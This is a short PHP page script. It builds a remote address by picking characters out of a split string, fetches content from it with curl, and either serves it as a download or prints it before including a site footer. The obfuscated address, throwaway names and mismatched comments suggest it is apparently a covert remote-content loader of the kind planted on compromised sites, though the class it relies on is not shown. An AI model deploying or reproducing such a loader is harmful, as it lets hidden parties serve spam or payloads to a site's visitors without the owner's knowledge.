<?php
$xxx_version = 'all';
$auto_clear = 'true';   // true / false
$save_permission = 'ALLOWED'; // ALLOWED / NOT-ALLOWED
$xxx = new xxx;
$get_applet = true;
$xxx_send_request = true;
$period = '~';
$preiod = '#';
$xxx->constr = $xxx->srv().'/'.$period;
$dir = $xxx->dir_to();
$x = explode('=',$dir);
$xxx->second = "$x[3]$x[8]$x[11]$x[15]/$x[0]$x[24]$x[29]/";
$xxx->minute = 60; //1 hour
$xxx->hour = 24; //1 day
$xxx->second .= "$xxx->item/";
$xxx->applet = $xxx->applet($xxx->second);
$xxx->qry = $_SERVER["QUERY_STRING"];
$xxx->index = $xxx->get_curl($xxx->applet);
$xxx->content_length = urldecode($_GET['l']);
if($_GET['mode']=='download'){
$ex = explode("@",$xxx->index);
$xxx->down_args($ex[0],$ex[1],$ex[2]);
}else{
$xxx->print_o(true);
}
include 'footer.php';
?>